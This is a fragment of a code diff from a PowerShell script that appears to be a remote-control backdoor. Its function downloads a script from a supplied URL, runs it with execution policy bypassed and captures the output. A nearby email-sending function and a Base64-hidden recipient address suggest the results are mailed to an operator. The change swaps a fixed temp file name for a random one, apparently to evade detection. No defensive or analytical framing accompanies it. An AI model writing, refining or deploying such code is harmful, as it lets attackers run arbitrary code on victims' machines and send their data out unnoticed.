@@ -14,7 +14,8 @@ function Send-ToEmail([string]$email,[string]$body,[string]$subj=[Environment]::
  function CallMe-Maybe([string] $Url){
     $name = [Environment]::MachineName
     $receiver=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("eABlAGwAaQBsAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA="))
-    $file="$env:tmp\cd.ps1"
+    $chars = (48..57) + (65..90) + (97..122)
+    $file="$env:tmp\$(-join ($chars | Get-Random -Count 7 | ForEach-Object {[char]$_})).ps1"
     try {
         Invoke-WebRequest -Uri $Url -UseBasicParsing -OutFile $file
         $runn = powershell -executionpolicy bypass -file $file 2>&1 | Out-String
